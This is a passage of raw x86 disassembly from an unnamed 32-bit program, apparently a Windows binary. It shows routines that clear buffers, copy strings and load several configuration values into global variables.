13149690:	e8 85 fd ff ff       	call   0x1314941a
13149695:	59                   	pop    %ecx
13149696:	85 c0                	test   %eax,%eax
13149698:	59                   	pop    %ecx
13149699:	75 0b                	jne    0x131496a6
1314969b:	89 5d 14             	mov    %ebx,0x14(%ebp)
1314969e:	eb 06                	jmp    0x131496a6
131496a0:	88 98 00 02 00 00    	mov    %bl,0x200(%eax)
131496a6:	57                   	push   %edi
131496a7:	ff 15 3c 35 15 13    	call   *0x1315353c
131496ad:	ff 75 08             	pushl  0x8(%ebp)
131496b0:	ff 15 3c 35 15 13    	call   *0x1315353c
131496b6:	ff 75 10             	pushl  0x10(%ebp)
131496b9:	ff 15 3c 35 15 13    	call   *0x1315353c
131496bf:	8b 45 14             	mov    0x14(%ebp),%eax
131496c2:	5f                   	pop    %edi
131496c3:	5e                   	pop    %esi
131496c4:	5b                   	pop    %ebx
131496c5:	c9                   	leave  
131496c6:	c3                   	ret    
131496c7:	8b 44 24 04          	mov    0x4(%esp),%eax
131496cb:	53                   	push   %ebx
131496cc:	56                   	push   %esi
131496cd:	57                   	push   %edi
131496ce:	85 c0                	test   %eax,%eax
131496d0:	bb f0 d5 14 13       	mov    $0x1314d5f0,%ebx
131496d5:	75 05                	jne    0x131496dc
131496d7:	bb b0 d5 14 13       	mov    $0x1314d5b0,%ebx
131496dc:	8b 3d ac d5 14 13    	mov    0x1314d5ac,%edi
131496e2:	85 c0                	test   %eax,%eax
131496e4:	75 06                	jne    0x131496ec
131496e6:	8b 3d a8 d5 14 13    	mov    0x1314d5a8,%edi
131496ec:	85 c0                	test   %eax,%eax
131496ee:	be 68 d5 14 13       	mov    $0x1314d568,%esi
131496f3:	75 05                	jne    0x131496fa
131496f5:	be 28 d5 14 13       	mov    $0x1314d528,%esi
131496fa:	68 30 5a 17 13       	push   $0x13175a30
131496ff:	68 a8 4b 17 13       	push   $0x13174ba8
13149704:	e8 d4 f4 ff ff       	call   0x13148bdd
13149709:	50                   	push   %eax
1314970a:	53                   	push   %ebx
1314970b:	57                   	push   %edi
1314970c:	56                   	push   %esi
1314970d:	e8 a2 fd ff ff       	call   0x131494b4
13149712:	83 c4 18             	add    $0x18,%esp
13149715:	5f                   	pop    %edi
13149716:	5e                   	pop    %esi
13149717:	5b                   	pop    %ebx
13149718:	c3                   	ret    
13149719:	8d 84 24 04 02 00 00 	lea    0x204(%esp),%eax
13149720:	50                   	push   %eax
13149721:	68 00 d1 14 13       	push   $0x1314d100
13149726:	68 30 5c 17 13       	push   $0x13175c30
1314972b:	ff 15 98 39 15 13    	call   *0x13153998
13149731:	83 c4 0c             	add    $0xc,%esp
13149734:	6a 01                	push   $0x1
13149736:	58                   	pop    %eax
13149737:	c3                   	ret    
13149738:	8b 44 24 04          	mov    0x4(%esp),%eax
1314973c:	56                   	push   %esi
1314973d:	57                   	push   %edi
1314973e:	bf a8 4d 17 13       	mov    $0x13174da8,%edi
13149743:	8d b0 00 02 00 00    	lea    0x200(%eax),%esi
13149749:	57                   	push   %edi
1314974a:	68 00 d1 14 13       	push   $0x1314d100
1314974f:	56                   	push   %esi
13149750:	ff 15 98 39 15 13    	call   *0x13153998
13149756:	68 00 04 00 00       	push   $0x400
1314975b:	6a 00                	push   $0x0
1314975d:	57                   	push   %edi
1314975e:	e8 bf 8e ff ff       	call   0x13142622
13149763:	33 c0                	xor    %eax,%eax
13149765:	83 c4 18             	add    $0x18,%esp
13149768:	38 06                	cmp    %al,(%esi)
1314976a:	5f                   	pop    %edi
1314976b:	5e                   	pop    %esi
1314976c:	0f 95 c0             	setne  %al
1314976f:	c3                   	ret    
13149770:	53                   	push   %ebx
13149771:	56                   	push   %esi
13149772:	8b 74 24 0c          	mov    0xc(%esp),%esi
13149776:	57                   	push   %edi
13149777:	56                   	push   %esi
13149778:	33 db                	xor    %ebx,%ebx
1314977a:	e8 c8 b3 ff ff       	call   0x13144b47
1314977f:	59                   	pop    %ecx
13149780:	6a 01                	push   $0x1
13149782:	5f                   	pop    %edi
13149783:	3b c7                	cmp    %edi,%eax
13149785:	75 02                	jne    0x13149789
13149787:	8b df                	mov    %edi,%ebx
13149789:	56                   	push   %esi
1314978a:	e8 39 8e ff ff       	call   0x131425c8
1314978f:	3b c7                	cmp    %edi,%eax
13149791:	59                   	pop    %ecx
13149792:	75 01                	jne    0x13149795
13149794:	43                   	inc    %ebx
13149795:	56                   	push   %esi
13149796:	e8 83 94 ff ff       	call   0x13142c1e
1314979b:	3b c7                	cmp    %edi,%eax
1314979d:	59                   	pop    %ecx
1314979e:	75 01                	jne    0x131497a1
131497a0:	43                   	inc    %ebx
131497a1:	56                   	push   %esi
131497a2:	e8 e9 86 ff ff       	call   0x13141e90
131497a7:	3b c7                	cmp    %edi,%eax
131497a9:	59                   	pop    %ecx
131497aa:	75 01                	jne    0x131497ad
131497ac:	43                   	inc    %ebx
131497ad:	56                   	push   %esi
131497ae:	e8 11 e6 ff ff       	call   0x13147dc4
131497b3:	3b c7                	cmp    %edi,%eax
131497b5:	59                   	pop    %ecx
131497b6:	75 01                	jne    0x131497b9
131497b8:	43                   	inc    %ebx
131497b9:	56                   	push   %esi
131497ba:	e8 86 eb ff ff       	call   0x13148345
131497bf:	3b c7                	cmp    %edi,%eax
131497c1:	59                   	pop    %ecx
131497c2:	75 01                	jne    0x131497c5
131497c4:	43                   	inc    %ebx
131497c5:	56                   	push   %esi
131497c6:	e8 64 ac ff ff       	call   0x1314442f
131497cb:	3b c7                	cmp    %edi,%eax
131497cd:	59                   	pop    %ecx
131497ce:	75 01                	jne    0x131497d1
131497d0:	43                   	inc    %ebx
131497d1:	56                   	push   %esi
131497d2:	e8 6d af ff ff       	call   0x13144744
131497d7:	3b c7                	cmp    %edi,%eax
131497d9:	59                   	pop    %ecx
131497da:	75 01                	jne    0x131497dd
131497dc:	43                   	inc    %ebx
131497dd:	56                   	push   %esi
131497de:	e8 c2 ef ff ff       	call   0x131487a5
131497e3:	3b c7                	cmp    %edi,%eax
131497e5:	59                   	pop    %ecx
131497e6:	75 01                	jne    0x131497e9
131497e8:	43                   	inc    %ebx
131497e9:	56                   	push   %esi
131497ea:	e8 d3 f2 ff ff       	call   0x13148ac2
131497ef:	3b c7                	cmp    %edi,%eax
131497f1:	59                   	pop    %ecx
131497f2:	75 01                	jne    0x131497f5
131497f4:	43                   	inc    %ebx
131497f5:	56                   	push   %esi
131497f6:	e8 4a 81 ff ff       	call   0x13141945
131497fb:	3b c7                	cmp    %edi,%eax
131497fd:	59                   	pop    %ecx
131497fe:	75 01                	jne    0x13149801
13149800:	43                   	inc    %ebx
13149801:	5f                   	pop    %edi
13149802:	8b c3                	mov    %ebx,%eax
13149804:	5e                   	pop    %esi
13149805:	5b                   	pop    %ebx
13149806:	c3                   	ret    
13149807:	56                   	push   %esi
13149808:	33 f6                	xor    %esi,%esi
1314980a:	56                   	push   %esi
1314980b:	e8 60 ff ff ff       	call   0x13149770
13149810:	39 35 24 d1 14 13    	cmp    %esi,0x1314d124
13149816:	59                   	pop    %ecx
13149817:	74 05                	je     0x1314981e
13149819:	e8 5a f6 ff ff       	call   0x13148e78
1314981e:	ff 15 74 37 15 13    	call   *0x13153774
13149824:	39 35 14 24 15 13    	cmp    %esi,0x13152414
1314982a:	74 37                	je     0x13149863
1314982c:	39 35 38 d1 14 13    	cmp    %esi,0x1314d138
13149832:	74 0c                	je     0x13149840
13149834:	ff 35 84 68 17 13    	pushl  0x13176884
1314983a:	ff 15 80 33 15 13    	call   *0x13153380
13149840:	56                   	push   %esi
13149841:	ff 35 84 a5 17 13    	pushl  0x1317a584
13149847:	ff 15 d8 36 15 13    	call   *0x131536d8
1314984d:	56                   	push   %esi
1314984e:	ff 35 7c a5 17 13    	pushl  0x1317a57c
13149854:	ff 15 d8 36 15 13    	call   *0x131536d8
1314985a:	56                   	push   %esi
1314985b:	ff 15 ec 36 15 13    	call   *0x131536ec
13149861:	5e                   	pop    %esi
13149862:	c3                   	ret    
13149863:	56                   	push   %esi
13149864:	ff 15 b0 36 15 13    	call   *0x131536b0
1314986a:	5e                   	pop    %esi
1314986b:	c3                   	ret    
1314986c:	55                   	push   %ebp
1314986d:	8b ec                	mov    %esp,%ebp
1314986f:	83 ec 20             	sub    $0x20,%esp
13149872:	56                   	push   %esi
13149873:	57                   	push   %edi
13149874:	6a 04                	push   $0x4
13149876:	8d 45 fc             	lea    -0x4(%ebp),%eax
13149879:	5f                   	pop    %edi
1314987a:	57                   	push   %edi
1314987b:	50                   	push   %eax
1314987c:	68 98 0a 15 13       	push   $0x13150a98
13149881:	e8 a6 d6 ff ff       	call   0x13146f2c
13149886:	83 c4 0c             	add    $0xc,%esp
13149889:	6a 01                	push   $0x1
1314988b:	5e                   	pop    %esi
1314988c:	3b c6                	cmp    %esi,%eax
1314988e:	75 08                	jne    0x13149898
13149890:	8b 45 fc             	mov    -0x4(%ebp),%eax
13149893:	a3 34 d3 14 13       	mov    %eax,0x1314d334
13149898:	8d 45 f8             	lea    -0x8(%ebp),%eax
1314989b:	57                   	push   %edi
1314989c:	50                   	push   %eax
1314989d:	68 a4 0a 15 13       	push   $0x13150aa4
131498a2:	e8 85 d6 ff ff       	call   0x13146f2c
131498a7:	83 c4 0c             	add    $0xc,%esp
131498aa:	3b c6                	cmp    %esi,%eax
131498ac:	75 0d                	jne    0x131498bb
131498ae:	33 c0                	xor    %eax,%eax
131498b0:	39 45 f8             	cmp    %eax,-0x8(%ebp)
131498b3:	0f 95 c0             	setne  %al
131498b6:	a3 40 d1 14 13       	mov    %eax,0x1314d140
131498bb:	8d 45 f4             	lea    -0xc(%ebp),%eax
131498be:	57                   	push   %edi
131498bf:	50                   	push   %eax
131498c0:	68 18 0b 15 13       	push   $0x13150b18
131498c5:	e8 62 d6 ff ff       	call   0x13146f2c
131498ca:	83 c4 0c             	add    $0xc,%esp
131498cd:	3b c6                	cmp    %esi,%eax
131498cf:	75 08                	jne    0x131498d9
131498d1:	8b 45 f4             	mov    -0xc(%ebp),%eax
131498d4:	a3 38 d3 14 13       	mov    %eax,0x1314d338
131498d9:	8d 45 f0             	lea    -0x10(%ebp),%eax
131498dc:	57                   	push   %edi
131498dd:	50                   	push   %eax
131498de:	68 24 0b 15 13       	push   $0x13150b24
131498e3:	e8 44 d6 ff ff       	call   0x13146f2c
131498e8:	83 c4 0c             	add    $0xc,%esp
131498eb:	3b c6                	cmp    %esi,%eax
131498ed:	75 0d                	jne    0x131498fc
131498ef:	33 c0                	xor    %eax,%eax
131498f1:	39 45 f0             	cmp    %eax,-0x10(%ebp)
131498f4:	0f 95 c0             	setne  %al
131498f7:	a3 44 d1 14 13       	mov    %eax,0x1314d144
131498fc:	8d 45 ec             	lea    -0x14(%ebp),%eax
131498ff:	57                   	push   %edi
13149900:	50                   	push   %eax
13149901:	68 04 d1 14 13       	push   $0x1314d104
13149906:	e8 21 d6 ff ff       	call   0x13146f2c
1314990b:	83 c4 0c             	add    $0xc,%esp
1314990e:	3b c6                	cmp    %esi,%eax
13149910:	75 08                	jne    0x1314991a
13149912:	8b 45 ec             	mov    -0x14(%ebp),%eax
13149915:	a3 3c d3 14 13       	mov    %eax,0x1314d33c
1314991a:	8d 45 e8             	lea    -0x18(%ebp),%eax
1314991d:	57                   	push   %edi
1314991e:	50                   	push   %eax
1314991f:	68 14 d1 14 13       	push   $0x1314d114
13149924:	e8 03 d6 ff ff       	call   0x13146f2c
13149929:	83 c4 0c             	add    $0xc,%esp
1314992c:	3b c6                	cmp    %esi,%eax
1314992e:	75 0d                	jne    0x1314993d
13149930:	33 c0                	xor    %eax,%eax
13149932:	39 45 e8             	cmp    %eax,-0x18(%ebp)
13149935:	0f 95 c0             	setne  %al
13149938:	a3 28 24 15 13       	mov    %eax,0x13152428
1314993d:	8d 45 e4             	lea    -0x1c(%ebp),%eax
13149940:	57                   	push   %edi
13149941:	50                   	push   %eax
13149942:	68 98 f2 14 13       	push   $0x1314f298
13149947:	e8 e0 d5 ff ff       	call   0x13146f2c
1314994c:	83 c4 0c             	add    $0xc,%esp
1314994f:	3b c6                	cmp    %esi,%eax
13149951:	75 08                	jne    0x1314995b
13149953:	8b 45 e4             	mov    -0x1c(%ebp),%eax
13149956:	a3 40 d3 14 13       	mov    %eax,0x1314d340
1314995b:	8d 45 e0             	lea    -0x20(%ebp),%eax
1314995e:	57                   	push   %edi
1314995f:	50                   	push   %eax
13149960:	68 a4 f2 14 13       	push   $0x1314f2a4
13149965:	e8 c2 d5 ff ff       	call   0x13146f2c
1314996a:	83 c4 0c             	add    $0xc,%esp
1314996d:	3b c6                	cmp    %esi,%eax
1314996f:	5f                   	pop    %edi
13149970:	5e                   	pop    %esi
13149971:	75 0d                	jne    0x13149980
13149973:	33 c0                	xor    %eax,%eax
13149975:	39 45 e0             	cmp    %eax,-0x20(%ebp)
13149978:	0f 95 c0             	setne  %al
1314997b:	a3 24 24 15 13       	mov    %eax,0x13152424
13149980:	c9                   	leave  
13149981:	c3                   	ret    
13149982:	56                   	push   %esi
13149983:	57                   	push   %edi
13149984:	33 ff                	xor    %edi,%edi
13149986:	be 9c a5 17 13       	mov    $0x1317a59c,%esi
1314998b:	39 3d 40 d1 14 13    	cmp    %edi,0x1314d140
13149991:	57                   	push   %edi
13149992:	74 11                	je     0x131499a5
13149994:	56                   	push   %esi
13149995:	ff 35 34 d3 14 13    	pushl  0x1314d334
1314999b:	e8 b8 e3 ff ff       	call   0x13147d58
131499a0:	83 c4 0c             	add    $0xc,%esp
131499a3:	eb 06                	jmp    0x131499ab
131499a5:	e8 1a e4 ff ff       	call   0x13147dc4
131499aa:	59                   	pop    %ecx
131499ab:	39 3d 44 d1 14 13    	cmp    %edi,0x1314d144
131499b1:	57                   	push   %edi
131499b2:	74 11                	je     0x131499c5
131499b4:	56                   	push   %esi
131499b5:	ff 35 38 d3 14 13    	pushl  0x1314d338
131499bb:	e8 19 e9 ff ff       	call   0x131482d9
131499c0:	83 c4 0c             	add    $0xc,%esp
131499c3:	eb 06                	jmp    0x131499cb
131499c5:	e8 7b e9 ff ff       	call   0x13148345
131499ca:	59                   	pop    %ecx
131499cb:	39 3d 28 24 15 13    	cmp    %edi,0x13152428
131499d1:	57                   	push   %edi
131499d2:	74 11                	je     0x131499e5
131499d4:	56                   	push   %esi
131499d5:	ff 35 3c d3 14 13    	pushl  0x1314d33c
131499db:	e8 f9 7e ff ff       	call   0x131418d9
131499e0:	83 c4 0c             	add    $0xc,%esp
131499e3:	eb 06                	jmp    0x131499eb
131499e5:	e8 5b 7f ff ff       	call   0x13141945
131499ea:	59                   	pop    %ecx
131499eb:	39 3d 24 24 15 13    	cmp    %edi,0x13152424
131499f1:	57                   	push   %edi
131499f2:	74 11                	je     0x13149a05
131499f4:	56                   	push   %esi
131499f5:	ff 35 40 d3 14 13    	pushl  0x1314d340
131499fb:	e8 c1 a9 ff ff       	call   0x131443c1
13149a00:	83 c4 0c             	add    $0xc,%esp
13149a03:	eb 06                	jmp    0x13149a0b
13149a05:	e8 25 aa ff ff       	call   0x1314442f
13149a0a:	59                   	pop    %ecx
13149a0b:	5f                   	pop    %edi
13149a0c:	5e                   	pop    %esi
13149a0d:	c3                   	ret    
13149a0e:	56                   	push   %esi
13149a0f:	8b 74 24 08          	mov    0x8(%esp),%esi
13149a13:	85 f6                	test   %esi,%esi
13149a15:	b9 1c d4 14 13       	mov    $0x1314d41c,%ecx
13149a1a:	75 05                	jne    0x13149a21
13149a1c:	b9 dc d3 14 13       	mov    $0x1314d3dc,%ecx
13149a21:	85 f6                	test   %esi,%esi
13149a23:	b8 e4 0e 15 13       	mov    $0x13150ee4,%eax
13149a28:	75 05                	jne    0x13149a2f
13149a2a:	b8 d8 0e 15 13       	mov    $0x13150ed8,%eax
13149a2f:	6a 03                	push   $0x3
13149a31:	51                   	push   %ecx
13149a32:	50                   	push   %eax
13149a33:	e8 9f d3 ff ff       	call   0x13146dd7
13149a38:	83 c4 0c             	add    $0xc,%esp
13149a3b:	b9 60 d4 14 13       	mov    $0x1314d460,%ecx
13149a40:	85 f6                	test   %esi,%esi
13149a42:	75 05                	jne    0x13149a49
13149a44:	b9 5c d4 14 13       	mov    $0x1314d45c,%ecx
13149a49:	85 f6                	test   %esi,%esi
13149a4b:	b8 cc 0e 15 13       	mov    $0x13150ecc,%eax
13149a50:	75 05                	jne    0x13149a57
13149a52:	b8 c0 0e 15 13       	mov    $0x13150ec0,%eax
13149a57:	6a 04                	push   $0x4
13149a59:	51                   	push   %ecx
13149a5a:	50                   	push   %eax
13149a5b:	e8 77 d3 ff ff       	call   0x13146dd7
13149a60:	83 c4 0c             	add    $0xc,%esp
13149a63:	b9 a4 d4 14 13       	mov    $0x1314d4a4,%ecx
13149a68:	85 f6                	test   %esi,%esi
13149a6a:	75 05                	jne    0x13149a71
13149a6c:	b9 64 d4 14 13       	mov    $0x1314d464,%ecx
13149a71:	85 f6                	test   %esi,%esi
13149a73:	b8 b4 0e 15 13       	mov    $0x13150eb4,%eax
13149a78:	75 05                	jne    0x13149a7f
13149a7a:	b8 a8 0e 15 13       	mov    $0x13150ea8,%eax
13149a7f:	6a 03                	push   $0x3
13149a81:	51                   	push   %ecx
13149a82:	50                   	push   %eax
13149a83:	e8 4f d3 ff ff       	call   0x13146dd7
13149a88:	83 c4 0c             	add    $0xc,%esp
13149a8b:	b9 9c d3 14 13       	mov    $0x1314d39c,%ecx
13149a90:	85 f6                	test   %esi,%esi
13149a92:	75 05                	jne    0x13149a99
13149a94:	b9 5c d3 14 13       	mov    $0x1314d35c,%ecx
13149a99:	85 f6                	test   %esi,%esi
13149a9b:	5e                   	pop    %esi
13149a9c:	b8 9c 0e 15 13       	mov    $0x13150e9c,%eax
13149aa1:	75 05                	jne    0x13149aa8
13149aa3:	b8 90 0e 15 13       	mov    $0x13150e90,%eax
13149aa8:	6a 03                	push   $0x3
13149aaa:	51                   	push   %ecx
13149aab:	50                   	push   %eax
13149aac:	e8 26 d3 ff ff       	call   0x13146dd7
13149ab1:	83 c4 0c             	add    $0xc,%esp
13149ab4:	c3                   	ret    
13149ab5:	56                   	push   %esi
13149ab6:	8b 74 24 08          	mov    0x8(%esp),%esi
13149aba:	85 f6                	test   %esi,%esi
13149abc:	b9 68 d5 14 13       	mov    $0x1314d568,%ecx
13149ac1:	75 05                	jne    0x13149ac8
13149ac3:	b9 28 d5 14 13       	mov    $0x1314d528,%ecx
13149ac8:	85 f6                	test   %esi,%esi
13149aca:	b8 2c 0f 15 13       	mov    $0x13150f2c,%eax
13149acf:	75 05                	jne    0x13149ad6
13149ad1:	b8 20 0f 15 13       	mov    $0x13150f20,%eax
13149ad6:	6a 03                	push   $0x3
13149ad8:	51                   	push   %ecx
13149ad9:	50                   	push   %eax
13149ada:	e8 f8 d2 ff ff       	call   0x13146dd7
13149adf:	83 c4 0c             	add    $0xc,%esp
13149ae2:	b9 ac d5 14 13       	mov    $0x1314d5ac,%ecx
13149ae7:	85 f6                	test   %esi,%esi
13149ae9:	75 05                	jne    0x13149af0
13149aeb:	b9 a8 d5 14 13       	mov    $0x1314d5a8,%ecx
13149af0:	85 f6                	test   %esi,%esi
13149af2:	b8 14 0f 15 13       	mov    $0x13150f14,%eax
13149af7:	75 05                	jne    0x13149afe
13149af9:	b8 08 0f 15 13       	mov    $0x13150f08,%eax
13149afe:	6a 04                	push   $0x4
13149b00:	51                   	push   %ecx
13149b01:	50                   	push   %eax
13149b02:	e8 d0 d2 ff ff       	call   0x13146dd7
13149b07:	83 c4 0c             	add    $0xc,%esp
13149b0a:	b9 f0 d5 14 13       	mov    $0x1314d5f0,%ecx
13149b0f:	85 f6                	test   %esi,%esi
13149b11:	75 05                	jne    0x13149b18
13149b13:	b9 b0 d5 14 13       	mov    $0x1314d5b0,%ecx
13149b18:	85 f6                	test   %esi,%esi
13149b1a:	5e                   	pop    %esi
13149b1b:	b8 fc 0e 15 13       	mov    $0x13150efc,%eax
13149b20:	75 05                	jne    0x13149b27
13149b22:	b8 f0 0e 15 13       	mov    $0x13150ef0,%eax
13149b27:	6a 03                	push   $0x3
13149b29:	51                   	push   %ecx
13149b2a:	50                   	push   %eax
13149b2b:	e8 a7 d2 ff ff       	call   0x13146dd7
13149b30:	83 c4 0c             	add    $0xc,%esp
13149b33:	c3                   	ret    
13149b34:	55                   	push   %ebp
13149b35:	8b ec                	mov    %esp,%ebp
13149b37:	81 ec c4 00 00 00    	sub    $0xc4,%esp
13149b3d:	53                   	push   %ebx
13149b3e:	56                   	push   %esi
13149b3f:	6a 40                	push   $0x40
13149b41:	8d 45 bc             	lea    -0x44(%ebp),%eax
13149b44:	5b                   	pop    %ebx
13149b45:	53                   	push   %ebx
13149b46:	6a 00                	push   $0x0
13149b48:	50                   	push   %eax
13149b49:	e8 d4 8a ff ff       	call   0x13142622
13149b4e:	53                   	push   %ebx
13149b4f:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
13149b55:	6a 00                	push   $0x0
13149b57:	50                   	push   %eax
13149b58:	e8 c5 8a ff ff       	call   0x13142622
13149b5d:	53                   	push   %ebx
13149b5e:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
13149b64:	6a 00                	push   $0x0
13149b66:	50                   	push   %eax
13149b67:	e8 b6 8a ff ff       	call   0x13142622
13149b6c:	8d 45 bc             	lea    -0x44(%ebp),%eax
13149b6f:	6a 2b                	push   $0x2b
13149b71:	50                   	push   %eax
13149b72:	ff 75 0c             	pushl  0xc(%ebp)
13149b75:	e8 26 c1 ff ff       	call   0x13145ca0
13149b7a:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
13149b80:	6a 2b                	push   $0x2b
13149b82:	50                   	push   %eax
13149b83:	ff 75 14             	pushl  0x14(%ebp)
13149b86:	e8 15 c1 ff ff       	call   0x13145ca0
13149b8b:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
13149b91:	6a 2b                	push   $0x2b
13149b93:	50                   	push   %eax
13149b94:	ff 75 18             	pushl  0x18(%ebp)
13149b97:	e8 04 c1 ff ff       	call   0x13145ca0
13149b9c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
13149ba0:	83 c4 48             	add    $0x48,%esp
13149ba3:	8d 45 fc             	lea    -0x4(%ebp),%eax
13149ba6:	6a 04                	push   $0x4
13149ba8:	50                   	push   %eax
13149ba9:	68 38 0f 15 13       	push   $0x13150f38
13149bae:	e8 a2 d2 ff ff       	call   0x13146e55
13149bb3:	8b 75 08             	mov    0x8(%ebp),%esi
13149bb6:	83 c4 0c             	add    $0xc,%esp
13149bb9:	85 f6                	test   %esi,%esi
13149bbb:	b8 e4 0e 15 13       	mov    $0x13150ee4,%eax
13149bc0:	75 05                	jne    0x13149bc7
13149bc2:	b8 d8 0e 15 13       	mov    $0x13150ed8,%eax
13149bc7:	8d 4d bc             	lea    -0x44(%ebp),%ecx
13149bca:	6a 03                	push   $0x3
13149bcc:	51                   	push   %ecx
13149bcd:	50                   	push   %eax
13149bce:	e8 82 d2 ff ff       	call   0x13146e55
13149bd3:	83 c4 0c             	add    $0xc,%esp
13149bd6:	b8 cc 0e 15 13       	mov    $0x13150ecc,%eax
13149bdb:	85 f6                	test   %esi,%esi
13149bdd:	75 05                	jne    0x13149be4
13149bdf:	b8 c0 0e 15 13       	mov    $0x13150ec0,%eax
13149be4:	8d 4d 10             	lea    0x10(%ebp),%ecx
13149be7:	6a 04                	push   $0x4
13149be9:	51                   	push   %ecx
13149bea:	50                   	push   %eax
13149beb:	e8 65 d2 ff ff       	call   0x13146e55
13149bf0:	83 c4 0c             	add    $0xc,%esp
13149bf3:	b8 b4 0e 15 13       	mov    $0x13150eb4,%eax
13149bf8:	85 f6                	test   %esi,%esi
13149bfa:	75 05                	jne    0x13149c01
13149bfc:	b8 a8 0e 15 13       	mov    $0x13150ea8,%eax
13149c01:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
13149c07:	6a 03                	push   $0x3
13149c09:	51                   	push   %ecx
13149c0a:	50                   	push   %eax
13149c0b:	e8 45 d2 ff ff       	call   0x13146e55
13149c10:	83 c4 0c             	add    $0xc,%esp
13149c13:	b8 9c 0e 15 13       	mov    $0x13150e9c,%eax
13149c18:	85 f6                	test   %esi,%esi
13149c1a:	75 05                	jne    0x13149c21
13149c1c:	b8 90 0e 15 13       	mov    $0x13150e90,%eax
13149c21:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
13149c27:	6a 03                	push   $0x3
13149c29:	51                   	push   %ecx
13149c2a:	50                   	push   %eax
13149c2b:	e8 25 d2 ff ff       	call   0x13146e55
13149c30:	83 c4 0c             	add    $0xc,%esp
13149c33:	b8 1c d4 14 13       	mov    $0x1314d41c,%eax
13149c38:	85 f6                	test   %esi,%esi
13149c3a:	75 05                	jne    0x13149c41
13149c3c:	b8 dc d3 14 13       	mov    $0x1314d3dc,%eax
13149c41:	8d 4d bc             	lea    -0x44(%ebp),%ecx
13149c44:	53                   	push   %ebx
13149c45:	51                   	push   %ecx
13149c46:	50                   	push   %eax
13149c47:	e8 04 8b ff ff       	call   0x13142750
13149c4c:	83 c4 0c             	add    $0xc,%esp
13149c4f:	b8 a4 d4 14 13       	mov    $0x1314d4a4,%eax
13149c54:	85 f6                	test   %esi,%esi
13149c56:	75 05                	jne    0x13149c5d
13149c58:	b8 64 d4 14 13       	mov    $0x1314d464,%eax
13149c5d:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
13149c63:	53                   	push   %ebx
13149c64:	51                   	push   %ecx
13149c65:	50                   	push   %eax
13149c66:	e8 e5 8a ff ff       	call   0x13142750
13149c6b:	83 c4 0c             	add    $0xc,%esp
13149c6e:	b8 9c d3 14 13       	mov    $0x1314d39c,%eax
13149c73:	85 f6                	test   %esi,%esi
13149c75:	75 05                	jne    0x13149c7c
13149c77:	b8 5c d3 14 13       	mov    $0x1314d35c,%eax
13149c7c:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
13149c82:	53                   	push   %ebx
13149c83:	51                   	push   %ecx
13149c84:	50                   	push   %eax
13149c85:	e8 c6 8a ff ff       	call   0x13142750
13149c8a:	83 c4 0c             	add    $0xc,%esp
13149c8d:	85 f6                	test   %esi,%esi
13149c8f:	5e                   	pop    %esi
13149c90:	5b                   	pop    %ebx
13149c91:	75 08                	jne    0x13149c9b
13149c93:	8b 45 10             	mov    0x10(%ebp),%eax
13149c96:	a3 5c d4 14 13       	mov    %eax,0x1314d45c
13149c9b:	c9                   	leave  
13149c9c:	c3                   	ret    
13149c9d:	55                   	push   %ebp
13149c9e:	8b ec                	mov    %esp,%ebp
13149ca0:	81 ec 84 00 00 00    	sub    $0x84,%esp
13149ca6:	56                   	push   %esi
13149ca7:	6a 40                	push   $0x40
13149ca9:	8d 45 bc             	lea    -0x44(%ebp),%eax
13149cac:	6a 00                	push   $0x0
13149cae:	50                   	push   %eax
13149caf:	e8 6e 89 ff ff       	call   0x13142622
13149cb4:	6a 40                	push   $0x40
13149cb6:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
13149cbc:	6a 00                	push   $0x0
13149cbe:	50                   	push   %eax
13149cbf:	e8 5e 89 ff ff       	call   0x13142622
13149cc4:	8d 45 bc             	lea    -0x44(%ebp),%eax
13149cc7:	6a 2b                	push   $0x2b
13149cc9:	50                   	push   %eax
13149cca:	ff 75 0c             	pushl  0xc(%ebp)
13149ccd:	e8 ce bf ff ff       	call   0x13145ca0
13149cd2:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
13149cd8:	6a 2b                	push   $0x2b
13149cda:	50                   	push   %eax
13149cdb:	ff 75 14             	pushl  0x14(%ebp)
13149cde:	e8 bd bf ff ff       	call   0x13145ca0
13149ce3:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
13149ce7:	8d 45 fc             	lea    -0x4(%ebp),%eax
13149cea:	6a 04                	push   $0x4
13149cec:	50                   	push   %eax
13149ced:	68 38 0f 15 13       	push   $0x13150f38
13149cf2:	e8 5e d1 ff ff       	call   0x13146e55
13149cf7:	8b 75 08             	mov    0x8(%ebp),%esi
13149cfa:	83 c4 3c             	add    $0x3c,%esp
13149cfd:	85 f6                	test   %esi,%esi
13149cff:	b8 2c 0f 15 13       	mov    $0x13150f2c,%eax
13149d04:	75 05                	jne    0x13149d0b
13149d06:	b8 20 0f 15 13       	mov    $0x13150f20,%eax
13149d0b:	8d 4d bc             	lea    -0x44(%ebp),%ecx
13149d0e:	6a 03                	push   $0x3
13149d10:	51                   	push   %ecx
13149d11:	50                   	push   %eax
13149d12:	e8 3e d1 ff ff       	call   0x13146e55
13149d17:	83 c4 0c             	add    $0xc,%esp
13149d1a:	b8 fc 0e 15 13       	mov    $0x13150efc,%eax
13149d1f:	85 f6                	test   %esi,%esi
13149d21:	75 05                	jne    0x13149d28
13149d23:	b8 f0 0e 15 13       	mov    $0x13150ef0,%eax
13149d28:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
13149d2e:	6a 03                	push   $0x3
13149d30:	51                   	push   %ecx
13149d31:	50                   	push   %eax
13149d32:	e8 1e d1 ff ff       	call   0x13146e55
13149d37:	83 c4 0c             	add    $0xc,%esp
13149d3a:	b8 14 0f 15 13       	mov    $0x13150f14,%eax
13149d3f:	85 f6                	test   %esi,%esi
13149d41:	75 05                	jne    0x13149d48
13149d43:	b8 08 0f 15 13       	mov    $0x13150f08,%eax
13149d48:	8d 4d 10             	lea    0x10(%ebp),%ecx
13149d4b:	6a 04                	push   $0x4
13149d4d:	51                   	push   %ecx
13149d4e:	50                   	push   %eax
13149d4f:	e8 01 d1 ff ff       	call   0x13146e55
13149d54:	83 c4 0c             	add    $0xc,%esp
